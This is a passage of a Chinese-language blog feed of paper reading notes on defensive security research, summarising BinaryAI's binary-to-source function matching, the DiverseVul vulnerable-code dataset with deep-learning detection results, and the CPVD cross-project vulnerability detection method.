id="32-二进制-源代码函数匹配准确度"><strong>3.2 二进制-源代码函数匹配准确度</strong></h2><p>尽管BinaryAI 在从大规模数据中检索源代码函数方面相较于现有最先进技术展现出了显著的性能提升。然而，BinaryAI 在二进制-源代码匹配方面仍然存在局限性，尤其是在直接应用recall@1指标时（如表所示，在SCA测试集中的23,529次查询中达到了22.73%的召回率），这对于后续的二进制SCA任务而言是不够的。所以我们进而探究了链接时局部相关性驱动的函数匹配的准确性及其对二进制-源代码匹配的贡献。</p><p>表中展示了以top-10相似函数为输入的匹配结果。除了精确匹配的结果之外，我们还评估了模糊匹配的结果，因为这些结果适用于其他不依赖极高精确度的下游任务，例如逆向工程。总体来看，我们发现精确匹配的平均精确度达到了81.63%，所有二进制文件的精确度均超过了75%。此外，模糊匹配的平均精确度为95.86%，在所有二进制文件中均超过了90%。这些结果表明，基于链接时局部相关性和函数调用图的函数匹配具有高准确性，并且能够适用于SCA测试集中的所有二进制文件。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241544332.webp" alt="图片"></p><p>我们进一步评估了对二进制-源代码匹配的贡献。图中展示了基于向量检索的原始recall@1，不同top-k检索结果作为链接时局部相关性驱动匹配的输入并得到更新后的recall@1，以及相应的recall@k，recall@k表示了模型能力限制下的召回上限。总体而言，链接时局部相关性驱动的函数匹配显著提高了原始的recall@1，几乎达到了BinaryAI和CodeCMR的各自的性能上限。对于BinaryAI，链接时局部相关性驱动的匹配将recall@1从22.73%提高到54.70%，对应top-10的上限为57.35%，并进一步将recall@1提高到66.90%，对应top-100的上限为70.45%。</p><p>实验结果表明了链接时局部相关性驱动的函数匹配的贡献，以及BinaryAI中二进制-源代码匹配分两个阶段来识别语法和语义代码特征的有效性。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241544311.webp" alt="图片"></p><h2 id="33-二进制sca性能">3.3 二进制SCA性能</h2><p>最后，我们比较了BinaryAI与现有二进制SCA工具的性能。表中展示了150个二进制文件中人工标记的1,045个TPL组件检测的总体结果。BinaryAI第三方库检测的准确率85.84%以及召回率64.98%，显著优于其他SCA工具。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241544320.webp" alt="图片"></p><h1 id="4-总结">4 总结</h1><p>二进制软件成分分析是降低第三方库（TPL）引入风险的重要手段，保障了软件供应链安全。传统依赖基本语法特征的SCA 技术在大规模TPL数据集表现出较高的误报率。腾讯安全科恩实验室自研二进制分析工具BinaryAI基于底座的二进制-源代码匹配模型BAI以及链接时局部相关性驱动的函数匹配实现相似源代码函数的高召回率，使得二进制SCA效果达行业高阶水准。</p><h2 id="参考文献"><strong>参考文献</strong></h2><p><strong>1.</strong> Synopsys. 2023. Black Duck Binary Analysis (BDBA). <a href="https://www">https://www</a>. <a href="http://synopsys.com/software-integrity/security-testing/software-compositionanalysis/binary-analysis.html">synopsys.com/software-integrity/security-testing/software-compositionanalysis/binary-analysis.html</a>.</p><p><strong>2.</strong> Zimu Yuan, Muyue Feng, Feng Li, Gu Ban, Yang Xiao, Shiyang Wang, Qian Tang, He Su, Chendong Yu, Jiahuan Xu, et al. 2019. B2sfinder: detecting open-source software reuse in cots software. In 2019 34th IEEE/ACM International Conference on Automated Software Engineering (ASE). IEEE, 1038–1049.</p><p><strong>3.</strong> Scantist. 2023. Scantist Binary Analysis. <a href="https://scantist.io">https://scantist.io</a></p><p><strong>4.</strong> Ruian Duan, Ashish Bijlani, Meng Xu, Taesoo Kim, and Wenke Lee. 2017. Identifying open-source license violation and 1-day security risk at large scale. In Proceedings of the 2017 ACM SIGSAC Conference on computer and communications security. 2169–2185.</p><p><strong>5.</strong> Stella Biderman, Hailey Schoelkopf, Quentin Gregory Anthony, Herbie Bradley, Kyle O’Brien, Eric Hallahan, Mohammad Aflah Khan, Shivanshu Purohit, USVSN Sai Prashanth, Edward Raff, et al. 2023. Pythia: A suite for analyzing large language models across training and scaling. In International Conference on Machine Learning. PMLR, 2397–2430.</p><p>**6.**Wei Tang, Yanlin Wang, Hongyu Zhang, Shi Han, Ping Luo, and Dongmei Zhang. 2022. LibDB: An Effective and Efficient Framework for Detecting Third-Party Libraries in Binaries. In 2022 IEEE/ACM 19th International Conference on Mining Software Repositories (MSR). 423–434.</p><p><strong>7.</strong> Zeping Yu, Wenxin Zheng, Jiaqi Wang, Qiyi Tang, Sen Nie, and Shi Wu. 2020. Codecmr: Cross-modal retrieval for function-level binary source code matching. Advances in Neural Information Processing Systems 33 (2020), 3872–3883.</p><p><strong>8.</strong> Ling Jiang, Hengchen Yuan, Qiyi Tang, Sen Nie, Shi Wu, and Yuqun Zhang. 2023. Third-Party Library Dependency for Large-Scale SCA in the C/C++ Ecosystem: How Far Are We?. In Proceedings of the 32nd ACM SIGSOFT International Symposium on Software Testing and Analysis.</p><aside> 💡 Others<hr>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Binary </tag>
            
            <tag> LLM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DiverseVul A New Vulnerable Source Code Dataset for Deep Learning Based Vulnerability Detection</title>
      <link href="/2023/12/18/Papers/Vul/DiverseVul/"/>
      <url>/2023/12/18/Papers/Vul/DiverseVul/</url>
      
        <content type="html"><![CDATA[<blockquote></blockquote><h1 id="0-abstract">0 Abstract</h1><p>我们提出并发布了一个新的漏洞源代码数据集。我们通过抓取安全问题网站、从相应项目中提取漏洞修复提交和源代码来整理数据集。我们的新数据集包含跨越 150 个 CWE 的 18,945 个脆弱函数，以及从 7,514 个提交中提取的 330,492 个非脆弱函数。我们的数据集涵盖的项目数量比之前所有数据集的总和还要多 295 个。</p><p>结合我们的新数据集和以前的数据集，我们分析了使用深度学习检测软件漏洞所面临的挑战和有前景的研究方向。我们研究了属于 4 个系列的 11 种模型架构。我们的研究结果表明，由于误报率高、F1 分数低以及难以检测硬 CWE，深度学习在漏洞检测方面还没有做好准备。特别是，我们展示了部署基于深度学习的模型所面临的重要通用化挑战。我们表明，增加训练数据量可能不会进一步提高深度学习模型在漏洞检测方面的性能，但可能有助于提高对未见项目的泛化能力。</p><p>我们还确定了充满希望的未来研究方向。我们证明，大型语言模型（LLMs）是基于 ML 的漏洞检测的一个有前途的研究方向，在我们的实验中，其性能优于具有代码结构特征的图形神经网络（GNNs）。此外，开发针对源代码的预训练目标也是提高漏洞检测性能的一个有前途的研究方向。</p><h1 id="1-intro-or-overview">1 Intro or Overview</h1><p>为了使深度学习成功，我们需要一个大型的易受攻击的源代码数据集。我们发布了一个新的开放漏洞数据集，用于C/C++，名为DiverseVul。为了策划这个数据集，**我们爬取安全问题网站，收集漏洞报告，提取每个漏洞的漏洞修复提交，克隆相应的项目，并从中提取易受攻击和非易受攻击的源代码。**我们的<u>数据集包含了18,945个易受攻击的函数和330,492个非易受攻击的函数，</u>从7,514次提交中提取出来，涵盖了150个CWE。这比之前最大最多样化的数据集CVEFixes [2]中的C/C++数据大小超过两倍。我们的数据集更加多样化，覆盖的项目几乎比所有先前发布的数据集的组合多50%。我们向社区公开发布了DiverseVul数据集，网址为https://github.com/wagner-group/diversevul。</p><p>我们的新数据集使我们能够研究最先进的深度学习方法，并对基于ML的漏洞检测的有希望的研究方向以及挑战获得新的见解。我们研究了几个问题。更多的训练数据是否有帮助，还是模型饱和了？模型架构是否有重大影响？使用依赖代码结构特征的最先进模型更好，还是使用大型语言模型更好？更大的LLM是否比更小的LLM更好？进一步改进深度学习以用于漏洞检测的最有希望的方向是什么？</p><p>我们还探索了将大型语言模型（LLMs）应用于漏洞检测，因为LLMs在自然语言处理和代码理解方面已经取得了最先进的成果，尽管它们不使用代码结构特征。我们研究了这些模型在三个数据集上的表现：（1）CVEFixes [2]，C/C++漏洞的最大先前发布数据集；（2）所有先前发布数据集的组合（Devign [33]、ReVeal [4]、BigVul [9]、CrossVul [19]、CVEFixes [2]），去重；（3）这些先前数据集和我们的DiverseVul的组合（详细信息见表3）。</p><p>我们的实验表明，在评估先前的数据集CVEFixes [2]时，模型架构几乎没有影响，LLMs的表现与GNNs大致相同。特别是在CVEFixes上，最大的先前发布的数据集上，ReVeal模型（GNN）实现12.8的F1分数，而LLMs的F1分数为8.5-16.3（见图1）。有人可能会从中得出精确架构几乎没有影响的结论。然而，当在更大的数据集上评估时，我们可以看到这一结论被扭转：LLMs的表现要比GNNs好得多。特别是，当我们将所有先前发布的数据集与我们的DiverseVul结合时，最好的LLM实现了47.2的F1分数，而ReVeal为29.8。<strong>这些实验表明，我们需要大规模数据集来可靠评估深度学习方法对漏洞检测的影响，随着可用培训数据量的增加，不同架构的相对性能会发生根本性变化</strong>：培训数据量增加5倍（从CVEFixes到所有数据集）将我们最佳模型的表现从10.5提高到48.9的F1分数。它们表明，<strong>LLMs比GNNs更能够利用大规模数据集</strong>：**更大的数据集仅轻微提高了ReVeal的表现，但显著提高了LLMs的表现。**然而，==我们的实验表明，通过收集更多数据来提高性能可能已经停滞。==通过将我们的数据集添加到先前数据集的组合中，我们可以提高11种模型中的7种模型的测试性能。然而，对于性能排名前三的模型，我们要么看不到改进，要么改进很小（详见4.2节）。</p><p>不幸的是，最新的深度学习技术仍未准备好进行漏洞检测。我们最佳模型的F1分数为47.2%，真正阳性率为43.3%，假阳性率为3.5%。假阳性率仍然太高，以至于模型在实践中无法发挥作用。一个项目可能包含成千上万个功能，这个假阳性率对应着数百个假阳性，这比大多数分析人员愿意翻阅的数量要多。尽管存在挑战，图1表明，大型语言模型（LLMs）可能在基于深度学习的漏洞检测方面表现更好。<u>在之前的论文中，研究人员认为具有代码结构特征的GNN对于漏洞检测是有前途的，因为它结合了领域知识和深度学习。</u>相比之下，我们的结果表明，**大型语言模型（RoBERTa、GPT-2和T5系列）在训练更多数据时明显优于最新的GNN，**特别是CodeT5模型（CodeT5 Small、CodeT5 Base、NatGen）表现最好。与普遍认为对于LLMs表现良好，模型大小是最重要因素不同，我们的结果显示，最重要的因素可能是LLM的训练方式。在代码理解任务的预训练似乎能够带来很大的改善。例如，**CodeT5 Small被预训练用于预测变量和函数名称，它的平均F1分数比两倍于它的大小但未在代码上进行预训练的模型高出8个百分点。**令人惊讶的是，我们发现在自然语言方面有效的预训练任务对漏洞检测帮助不大。相反，看来我们需要代码特定的预训练任务。我们认为开发更好的代码特定预训练任务是改善基于深度学习的漏洞检测的一个有前途的研究方向。</p><p>此外，我们确定了一个部署基于深度学习模型的重要泛化挑战。要部署一个模型，我们需要检测新软件项目中的漏洞，这些漏洞在训练集中没有出现。我们发现，在这种情况下，深度学习模型表现非常糟糕。特别是，过去的工作将数据分为训练集和测试集，通过随机分割漏洞，而不考虑每个漏洞出现在哪个项目中。然而，在实践中，我们经常希望在新项目上运行漏洞检测工具，因此在训练集中不会有该项目的任何漏洞。为了评估深度学习在这种情况下的性能，**我们留出了一组项目，我们称之为“未见项目”；我们使用来自其他项目的漏洞进行训练（“已见项目”），然后在未见项目中测试。**所有模型在未见项目上的性能显著下降，例如，在已见项目上的F1分数从49%降至未见项目上的仅9.4％。原因不明；也许模型过度拟合了特定于出现在训练集中的特定项目的模式或编码习惯。  我们希望未来的研究能够探讨如何解决这个问题。我们建议在训练损失中使用类别权重进行简单干预，这在这个方向上迈出了一小步，但差距仍然很大，需要更多的工作。</p><p>最后，我们量化了数据集中的标签噪声以及先前的数据集。 标签噪声是基于机器学习的漏洞检测研究面临的重要挑战。 为了从漏洞修复提交中提取易受攻击的函数，我们遵循了最先进的方法（由Devign [33]、ReVeal [4]、BigVul [9]、CrossVul [19]、CVEFixes [2]使用），我们将这些提交更改的函数标记为易受攻击。为了了解这种标记方法的标签准确性，我们从我们的数据集中随机抽取50个易受攻击的函数，另外从收集NVD提交的三个数据集的并集（BigVul、CrossVul和CVEFixes）中抽取50个易受攻击的函数。然后，我们手动分析漏洞和标记的易受攻击函数。我们的结果发现DiverseVul中易受攻击函数的标签准确率为60%，比CVEFixes、BigVul和CrossVul的并集高出24%，但仍存在许多标签错误。主要挑战是漏洞分布在多个函数中以及在漏洞修复提交中对非易受攻击函数的更改。我们希望我们的工作迈出了解决标签噪声问题的第一步，并强调了深入调查标签噪声影响的必要性。</p><p>本文作出如下贡献：</p><p>• 我们发布了DiverseVul，一款新的C/C<ins>易受攻击源代码数据集。我们的数据集比以前最大的C/C</ins>数据集大60％，并且比所有以前的数据集更多样化。</p><p>• 我们研究了来自4个不同模型系列的11种模型架构。我们的结果表明，大型语言模型在基于深度学习的漏洞检测方面优于最先进的图神经网络，并且开发源代码特定的预训练目标是一个有前途的研究方向。</p><p>• 我们确定了深度学习在漏洞检测中面临的挑战。特别是，我们强调了将泛化到培训集之外的未看到的项目的困难。</p><p>• 我们评估了我们数据集中和依赖于漏洞修复提交的以前数据集中的标签噪声。</p><h2 id="11-problem-and-challenge">1.1 Problem and Challenge</h2><p>深度学习模型在漏洞检测上能够成功的一个重要条件是庞大的漏洞代码数据样本的支撑，我们需要大规模数据集来可靠评估深度学习方法对漏洞检测的影响，随着可用培训数据量的增加，不同架构的相对性能会发生根本性变化。<strong>LLMs比GNNs更能够利用大规模数据集</strong>：**更大的数据集仅轻微提高了ReVeal的表现，但显著提高了LLMs的表现。**然而，我们的实验表明，通过收集更多数据来提高性能可能已经停滞。与普遍认为对于LLMs表现良好，模型大小是最重要因素不同，我们的结果显示，最重要的因素可能是LLM的训练方式。在代码理解任务的预训练似乎能够带来很大的改善。我们认为开发更好的代码特定预训练任务是改善基于深度学习的漏洞检测的一个有前途的研究方向。</p><p>此外，我们确定了一个部署基于深度学习模型的重要泛化挑战。要部署一个模型，我们需要检测新软件项目中的漏洞，这些漏洞在训练集中没有出现。我们发现，在这种情况下，深度学习模型表现非常糟糕。然而，在实践中，我们经常希望在新项目上运行漏洞检测工具，因此在训练集中不会有该项目的任何漏洞。所有模型在未见项目上的性能显著下降，例如，在已见项目上的F1分数从49%降至未见项目上的仅9.4％。原因不明；也许模型过度拟合了特定于出现在训练集中的特定项目的模式或编码习惯。</p><h2 id="12-motivation">1.2 Motivation</h2><p>更多的训练数据是否有帮助，还是模型饱和了？</p><p>模型架构是否有重大影响？</p><p>使用依赖代码结构特征的最先进模型更好，还是使用大型语言模型更好？</p><p>更大的LLM是否比更小的LLM更好？</p><p>进一步改进深度学习以用于漏洞检测的最有希望的方向是什么？</p><h1 id="3-experiment-and-evaluation">3 Experiment and Evaluation</h1><h2 id="32-evaluation">3.2 <strong>Evaluation</strong></h2><p>**结果1：当在所有可用数据上进行训练时，大型语言模型明显优于最先进的基于 GNN 的 ReVeal 模型。**当在所有可用数据（以前 + DiverseVul）上进行训练时，LLMs的表现显著优于ReVeal模型：ReVeal模型实现了29.76的F1分数，而LLMs的F1分数为31.96至47.15。最佳的LLM在这个大型训练集上表现明显优于ReVeal。比较ReVeal和LLMs可能是不公平的，因为ReVeal的参数数量比LLMs少1-2个数量级。我们不知道更大的GNN是否能与LLMs竞争。不幸的是，即使是表现最好的模型NatGen，也还不适合部署在漏洞检测中，具有3.47%的误报率和47.15%的F1分数。这种误报率仍然太高，不够实用，而F1分数仍然偏低。尽管如此，我们相信大型语言模型在基于深度学习的漏洞检测领域具有潜力。有趣的是，LLMs需要大量的训练数据才能超越ReVeal。当仅在CVEFixes数据上进行训练时，这是一个更小的训练集，LLMs相对于基于GNN的ReVeal模型并没有明显的优势，在这种情况下，ReVeal甚至比LLMs中的6个（共10个）更好。</p><p>**结果2：在三个基本LLM模型中，T5 Base在漏洞检测中表现优于RoBERTa和GPT-2 Base。**RoBERTa只使用编码器，GPT-2只使用解码器，而T5使用编码器-解码器Transformer层。当在以前+DiverseVul上进行训练时，T5 Base的测试F1分数分别比RoBERTa和GPT-2 Base高7.35%和9.3%。因此，编码器-解码器架构可能比仅解码器/编码器架构具有优势。</p><p>**结果3：在代码上进行预训练，如果我们只使用自然语言预训练任务，并不会显著提高漏洞预测。**代码模型CodeBERT、GraphCodeBERT、CodeGPT、PolyCoder并不比相应的文本模型RoBERTa和GPT-2 Base显著更好。具体来说，当在Previous数据集上进行训练时，CodeBERT和GraphCodeBERT的表现与RoBERTa类似。当在Previous + DiverseVul数据集上进行训练时，CodeBERT和GraphCodeBERT将F1分数提高了最多达到2.8%，相比于RoBERTa。</p><p>**结果4：在C/C<ins>上进行特定于代码的预训练任务对改进漏洞检测性能有很大影响。**两个CodeT5模型和NatGen模型具有最佳的F1分数。它们是使用C/C</ins>上的代码特定预训练任务进行预训练的。CodeT5模型使用标识符感知的预训练任务：掩码标识符预测和标识符标记。NatGen在CodeT5的基础上进行额外的代码自然化预训练，例如删除死代码和重命名变量。这些预训练任务要求模型了解基本代码理解，这显著提高了用于漏洞检测任务的微调模型性能。请注意，GraphCodeBERT还进行了一些特定于代码的预训练，以从具有数据流的一对变量中学习嵌入，从而使点积值较大。然而，由于它没有在C/C++数据上进行训练，目前尚不清楚这种预训练任务对漏洞预测是否有效。</p><p>**结果5：特定于代码的预训练任务比模型大小更重要。**在表4中最好的三个模型中（CodeT5 Small，CodeT5 Base，NatGen），CodeT5 Small模型只有60M个参数，是RoBERTa模型和GPT-2模型大小的一半，并且是其他T5模型大小的不到三分之一。然而，CodeT5 Small的性能与最大的CodeT5 Base和NatGen模型非常相似，并且优于所有其他模型。与认为较大模型往往会产生更好性能的信念相反，我们的结果表明，特定于代码的预训练任务对漏洞检测的模型大小更为重要。</p><p>**结果6：从收集更多数据集中获得的性能提升可能已经达到饱和。**图2可视化了在DiverseVul + Previous数据上训练对比仅在Previous数据上训练有多大帮助提高漏洞检测性能。将DiverseVul添加到训练集中，平均提高了7种模型的F1分数2.4％，与仅使用Previous数据集训练相比。然而，这并没有帮助最佳表现的CodeT5模型，对NatGen的帮助也只是适度的。尽管通过在合并的Previous数据集上训练来提高模型性能的改进较大，但收集不同的数据集可能不会进一步改善这一点。</p><p>**结果7：增加训练数据集的数量，来自相同分布，有助于漏洞检测。**我们的结果显示，使用来自相同分布的更大数据集进行训练可以提高测试性能。</p><p>**结果8：深度学习模型在漏洞检测任务中普遍存在一个重要挑战，即通用化到未知测试项目。**AI用于代码的一个流行应用案例是GitHub CoPilot，其中AI模型在开发人员编写代码时建议如何完善代码。</p><p>**结果 9：使用类权重进行交叉熵损失可以提高模型对未知项目的泛化性能，但仍有很大的改进空间。**如果训练/测试样本来自相同分布，类权重也可以提高模型的性能。表6显示了使用不同方案微调的模型的评估结果。在已知/未知项目实验中，使用类权重可以提高三种模型架构的F1分数。项目平衡的批量采样器对泛化无帮助。加权软F1损失有助于CodeBERT和CodeT5 Small的泛化，但对已知项目的性能有损害。总的来说，类权重是最佳方案，因为它提高了已知和未知项目的性能。使用类权重训练的CodeT5 Small在未知项目上的测试F1分数最高（17.21%）。</p><p>**结果10：一些CWEs比其他CWEs容易学习，而不受训练数据大小的影响。**表7显示了CodeT5基础模型在37个CWEs上的预测性能。我们已经用粗体突出显示了培训集中最常见的10个CWEs和最高的真阳性率（TPR）数字。请注意，所有CWEs具有相同的假阳性率（FPR），因为FPR仅与非易受攻击的功能相关。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202501072116105.png" alt="image-20250107211606964"></p><h1 id="4-discussion">4 Discussion</h1><h2 id="conclusion">Conclusion</h2><aside> 💡 Others<hr>]]></content>
      
      
      <categories>
          
          <category> Papers </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件安全 </tag>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CPVD Cross Project Vulnerability Detection Based on Graph Attention Network and Domain Adaptation</title>
      <link href="/2023/12/18/Papers/Vul/CPVD%20Cross%20Project%20Vulnerability%20Detection%20Based%20on%20Graph%20Attention%20Network%20and%20Domain%20Adaptation/"/>
      <url>/2023/12/18/Papers/Vul/CPVD%20Cross%20Project%20Vulnerability%20Detection%20Based%20on%20Graph%20Attention%20Network%20and%20Domain%20Adaptation/</url>
      
        <content type="html"><![CDATA[<h2 id="0-abstract">0 Abstract</h2><p>代码漏洞检测对于软件安全预防至关重要。大规模软件代码中的漏洞注释非常繁琐且具有挑战性，这需要领域专家花费大量时间进行注释。这项工作提供了CPVD，这是一种跨域漏洞检测方法**，基于“学习使用一个具有丰富漏洞标签的项目快速预测另一个项目的漏洞标签”的挑战CPVD使用代码属性图来表示代码，并使用图注意力网络和卷积池网络来提取图特征向量。**在跨域漏洞检测的域自适应表示学习阶段，它减少了源域和目标域数据之间的分布。在本文中，我们在不同的真实世界项目代码上相互测试。与没有域自适应的方法和基于自然语言处理的域自适应方法相比，CPVD更通用，在跨域漏洞检测任务中表现更好。具体而言，对于chr_deb、qemu、libav和sard这四个数据集，它们的F1得分分别为70.2%、81.1%、59.7%和78.1%，AUC分别为88.4%、86.3%、85.2%和88.6%。</p><p>代码属性图，跨域漏洞检测，域自适应表示学习，图注意力网络。</p><h2 id="1-intro-or-overview">1 Intro or Overview</h2><h4 id="11-problem-and-challenge">1.1 Problem and Challenge</h4><p>在代码漏洞检测任务中，VulDeePecker、μVulDeePecker、SySeVR、Vuldeeplocator、Devign、BGNN4VD、Reveal和Ivdetect已经表明，使用神经网络进行自动特征提取比专家制作的特征具有更好的性能。VulDeePecker、μVulDeePecker、SySeVR和Vuldeeplocator将代码函数处理为标记序列，标记序列被处理为自然语言文本。然而，Devgin、BGNN4VD、Reveal和Ivdetect体现了通过图神经网络（以下简称GNN）提取代码函数的图结构特征。这些方法已被证明优于特征提取方法，如递归神经网络、Bi-LSTM和GRU。</p><p>然而，前面的技术都导致了漏洞识别问题中的另一个重要问题：项目中缺乏易感代码标签。数据集及其标签用于推动当前的深度学习模型。深度学习模型的预测性能由数据集的数量和质量以及它们的标记决定。由于漏洞标签的稀缺性，历史漏洞不足以训练和验证神经网络模型，尤其是对处于休眠状态的开源项目。</p><p>Vulnerability detection in large-scale software code is timeconsuming, complicated, and error-prone;</p><p>尽管源域和目标属于不同项目的漏洞代码集，但它们在相同的特征提取器后具有相似的特征空间和标签分布。尽管如此，它们的概率联合分布在跨域漏洞检测问题上更进一步。源域和目标域数据集用于漏洞分类任务，因此最终的分类目标是相同的。基于上述前提条件，可以在跨域漏洞识别中使用域自适应方法。</p><h4 id="12-motivation">1.2 Motivation</h4><h4 id="13-contribution">1.3 Contribution</h4><p>总之，本文的贡献如下：本文提出了一种将图注意力网络和域自适应表示学习相结合的跨域漏洞检测方法CPVD。这是图神经网络与领域自适应相结合进行跨领域漏洞检测的开端。基于这一想法，研究人员可以提出不同的方法来提高漏洞检测性能。本文验证了域自适应方法更适合于未标记的漏洞检测任务。本文验证了在跨域漏洞检测任务中，代码的图形表示优于令牌序列处理。本文验证了只有对源域进行重新采样才能提高漏洞检测性能。</p><h2 id="2-architecture-method">2 Architecture &amp; Method</h2><h4 id="21-system-overview">2.1 System Overview</h4><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403131546258.png" alt="image-20240313154641145"></p><h4 id="问题定义">问题定义</h4><p>跨域漏洞代码检测是一个二进制分类问题，旨在将目标域代码分为易受攻击和不易受攻击。跨域漏洞代码检测有两种域分布，即源域代码分布S（C，y）和目标域代码分布T（C，？），其中C是代码函数；y表示漏洞分类标签，y∈{0,1}，0表示没有漏洞，1表示有漏洞，“？”表示未知标签。此外，这两个域分布都有域标签，d∈{S，T}，如果d=S，则xG～S（xG）；else xG～T（xG），其中xG是样本的图特征向量。跨域漏洞检测的目标是训练一个神经网络Nf（C），以不断减少源域漏洞分类损失和域分类损失，最终实现对目标域中的代码漏洞进行准确分类的目标。上述损失可以正式定义为</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403131559058.png" alt="image-20240313155919021" style="zoom:67%;" /><p>其中，L是源域漏洞分类损失，y是漏洞分类标签，Ld是域分类损失，d是域标签。</p><h4 id="代码预处理">代码预处理</h4><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403142126819.png" alt="image-20240314212644742"></p><p>每个节点都包含一个键、代码语句和属性元素（例如Identifier、AssignmentExpression、ParameterType、ExpressionStatement），边表示节点之间的关系，边类型是对它们关系的描述，类型为IS_AST_PARENT、FLOWS_TO、DEF、USE、CONTROLS等。注意，每个函数都有不同的CPG，因为它们的语义和句法结构不同，所以函数的代码属性图不一定包含所有的边类型。改论文中使用了10种类型的边。</p><p>节点和边的类型分别用one-hot表示，语句用词嵌入技术进行表示。</p><h4 id="图特征提取">图特征提取</h4><p>图特征提取阶段的输入是标记的源域节点向量和未标记的目标域节点向量；对于标记的源域图，在预训练后输出图的特征向量，而对于未标记的目标域图，使用在源域中训练的模型来提取目标域图的向量特征。</p><p>代码预处理阶段输出的节点特征向量是独立于其他节点获得的，因此节点信息较差。代码属性图是根据代码之间的句法和语义结构构建的，每个节点都有一个语句片段，相邻节点之间存在很大的相关性和依赖性。为了最佳地表示节点特征，有必要将其相邻节点的信息映射到自身。因此使用具有双头注意力机制的图注意力网络。</p><p>由于源域代码具有标签，我们可以根据漏洞分类任务进行预训练，以获得源域图特征向量和训练后的模型。目标域图特征向量可以从训练的模型中获得。预训练损失函数是一个二分类交叉熵损失函数。</p><h4 id="领域自适应表示学习阶段">领域自适应表示学习阶段</h4><p>领域自适应表示学习阶段由四个部分组成：重采样和特征映射、源领域漏洞分类器和领域分类器。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403142151983.png" alt="image-20240314215125905"></p><p><strong>Resampling and Feature Mapping</strong></p><p>重采样方法使用SMOTETopek，它是过采样和欠采样的组合。重新采样后的源域平衡数据集和目标域不平衡数据集将进入表示学习网络。</p><p><strong>Source Domain Vulnerability Classifier</strong></p><p>漏洞分类器Cy（xL，yi）的输入是源域代码和源域漏洞标签的特征向量。我们使用完全连接层作为源域漏洞分类器。在每个完全连接的层之后，Relu被用作激活函数，Dropout被用于防止过拟合。为了使目标域样本接近源域样本，除了使用分类损失函数外，我们还设计了域自适应损失函数LST，以不断减少源域和目标域之间的分布差异。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403142224423.png" alt="image-20240314222420388"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403142225697.png" alt="image-20240314222501665"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403142226622.png" alt="image-20240314222647564"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403142227904.png" alt="image-20240314222753871"></p><p><strong>Domain Classifier</strong></p><p>在域分类器中，源域代码的标签为S，目标域代码的标记为T。因此，为了混淆源域和目标域，我们需要最大化域分类误差。域分类器Cd（xG，di）的输入是源或目标域码及其域标签，也就是说，xL∈SõT。我们使用全连接层作为域分类器，在每个全连接层之后使用Relu作为激活函数，并使用Dropout来防止过拟合。DANN[42]设计了一个梯度反转层，确保在反向传播过程中梯度方向自动反转，并在正向传播中进行身份转换。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403142228944.png" alt="image-20240314222811899"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202403142228852.png" alt="image-20240314222820817"></p><p>领域自适应表示学习阶段利用领域数据分布自适应的思想，在训练过程中训练整个领域表示学习网络。因此，模型训练有两个目标：第一是减少代码漏洞分类错误，以确保源域数据的正确分类；第二是增加域分类错误，混淆两个域的代码输入。因此，这一阶段的总损失函数包括两个部分：源域漏洞分类损失和域分类损失。</p><h2 id="3-experiment-and-evaluation">3 Experiment and Evaluation</h2><p>与没有域自适应的漏洞检测方法相比，CPVD在漏洞检测任务中的表现如何？</p><p>与适用于领域的漏洞检测方法相比，CPVD在漏洞检测任务中的表现如何？</p><p>本文中的图特征向量提取阶段的设计如何影响漏洞检测的性能？</p><p>对源域数据重新采样如何影响目标域中的漏洞检测性能？</p><p>与最先进的领域自适应方法相比，我们采用的领域自适应表示学习方法如何影响漏洞检测任务？</p><h4 id="31-dataset-and-process">3.1 DataSet and Process</h4><h4 id="32-evaluation">3.2 <strong>Evaluation</strong></h4><h2 id="4-conclusion">4 Conclusion</h2><h2 id="summary">Summary</h2><aside> 💡 Others<hr><p><strong>Cross-Domain Vulnerability Detection</strong></p><p>跨域漏洞检测问题可以看作是一个训练模型并学习通过使用具有大量标签的源域代码来预测目标域代码的漏洞标签问题的问题。因为标签只有两种（漏洞或非漏洞），所以它也可以被视为二分类的问题。==跨域漏洞检测以源域和目标域的代码函数为输入。它使用距离或对抗性网络来测量源域和目标之间的相似性。==它学习目标域的漏洞预测函数F:Xt→ yt，连续训练F使其具有最小的预测误差，然后在目标域中正确地预测输入代码的漏洞分类标签。</p><p><strong>Graph-Based Code Representation</strong></p><p>图的节点表示表达式或代码语句，基于图的表示的边反映节点之间的关系，如控制流、控制依赖关系和数据依赖关系。</p><p>语法树（以下简称AST）是一种特殊类型的图结构。AST是代码解析器理解程序基本结构并检查语法错误的第一步。它可以用于将源代码表示为树。关于语法CD VulD[19]、code2vec[22]和Infercode[23]的结构的信息是以AST结构表达源代码的作品的示例。</p><p>控制流图（以下简称CFG）是一种有向图，它描述了程序中进程的所有可能的实时执行流。条件语句控制执行路径，CFG的节点是单个语句。Cheng等人[24]、Zhuang等人[25]和Yu等人[26]以CFG的形式表示源代码。代码属性图（以下简称CPG）[27]由AST、数据流图、CFG和程序依赖图组成。代码属性图的每个元素都提供了关于源代码整体语义结构的附加上下文。总之，代码属性图是有向的、边类型的属性多重图，至少有一个属性指示每个节点的类型。Devign[13]、BGNN4VD[14]和VulSnipper[28]是由CPG表示为源代码的作品的示例。</p><p><strong>Word Vector Embedding</strong></p><p>Word2vec[29]是一种将语言文本中的每个单词转换为向量的编码方法，然后可以表示单词之间的关系。skip 